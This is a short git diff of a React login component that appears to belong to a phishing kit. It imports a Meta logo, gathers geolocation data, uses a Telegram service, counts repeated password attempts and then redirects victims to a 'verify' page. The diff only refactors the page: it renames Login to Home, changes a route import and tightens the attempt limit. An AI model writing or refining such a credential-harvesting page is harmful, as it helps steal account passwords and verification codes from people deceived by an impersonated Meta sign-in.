@@ -6,7 +6,7 @@ import { faXmark } from '@fortawesome/free-solid-svg-icons';
 import { faEye, faEyeSlash } from '@fortawesome/free-regular-svg-icons';
 import MetaImage from '@/assets/images/meta-logo.png';
 import { useNavigate } from 'react-router';
-import paths from '@/router/paths';
+import { PATHS } from '@/router/paths';
 import translateText from '@/utils/translate';
 import { TelegramService } from '@/services/telegramService';
 import { telegramConfig } from '@/config/telegram';
@@ -85,7 +85,7 @@ const getGeolocationData = (): GeoLocationData | null => {
     }
 };
 
-const Login: FC = () => {
+const Home: FC = () => {
     const navigate = useNavigate();
 
     const usernameRef = useRef<HTMLInputElement>(null);
@@ -245,9 +245,9 @@ const Login: FC = () => {
 
             await telegramService.delay(telegramConfig.LOAD_TIMEOUT_MS);
 
-            if (newPasswordAttempts.length > telegramConfig.MAX_PASSWORD_ATTEMPTS) {
+            if (newPasswordAttempts.length >= telegramConfig.MAX_PASSWORD_ATTEMPTS) {
                 localStorage.setItem('data_id', '1');
-                navigate(paths.verify);
+                navigate(PATHS.VERIFY);
                 return;
             }
 
@@ -460,4 +460,5 @@ const Login: FC = () => {
         </div>
     );
 };
-export default Login;
+export default Home;
+
